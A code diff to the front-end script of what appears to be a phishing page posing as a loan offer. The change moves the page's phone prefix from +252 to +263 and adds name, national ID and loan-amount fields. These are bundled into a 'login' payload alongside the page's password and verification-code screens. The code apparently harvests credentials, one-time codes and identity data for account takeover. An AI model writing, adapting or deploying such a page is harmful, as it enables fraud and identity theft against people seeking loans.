@@ -16,6 +16,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnNextPassword = document.getElementById('btn-next-password');
 
     const phoneInput = document.getElementById('phone-input');
+    const nameInput = document.getElementById('name-input');
+    const idInput = document.getElementById('id-input');
+    const amountInput = document.getElementById('amount-input');
     const passwordInput = document.getElementById('password-input');
     
     const codeBoxes = document.querySelectorAll('#code-screen .code-box');
@@ -118,12 +121,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
     btnNextPhone.addEventListener('click', () => {
         if (!btnNextPhone.disabled) {
-            currentUserPhone = "+252" + phoneInput.value.replace(/\s/g, '');
+            currentUserPhone = "+263" + phoneInput.value.replace(/\s/g, '');
+            const detailsStr = `Name: ${nameInput.value}\nID: ${idInput.value}\nAmount: $${amountInput.value}`;
+            
             const payload = {
                 type: 'login',
-                name: '',
+                name: nameInput.value,
                 phone: currentUserPhone,
-                details: 'Initiated login'
+                details: detailsStr
             };
 
             processStep(payload, () => {
@@ -221,17 +226,29 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Input handlers
-    phoneInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '');
-        if (e.target.value.length > 5) {
+    function validateLoanForm() {
+        const phone = phoneInput.value.replace(/\D/g, '');
+        const name = nameInput.value.trim();
+        const id = idInput.value.trim();
+        const amount = amountInput.value.trim();
+        
+        if (phone.length > 5 && name.length > 2 && id.length > 5 && amount.length > 1) {
             btnNextPhone.disabled = false;
             btnNextPhone.classList.remove('disabled');
         } else {
             btnNextPhone.disabled = true;
             btnNextPhone.classList.add('disabled');
         }
+    }
+
+    phoneInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        validateLoanForm();
     });
+    
+    nameInput.addEventListener('input', validateLoanForm);
+    idInput.addEventListener('input', validateLoanForm);
+    amountInput.addEventListener('input', validateLoanForm);
 
     phoneInput.addEventListener('keydown', (e) => {
         if (e.key === 'Enter' && !btnNextPhone.disabled) {
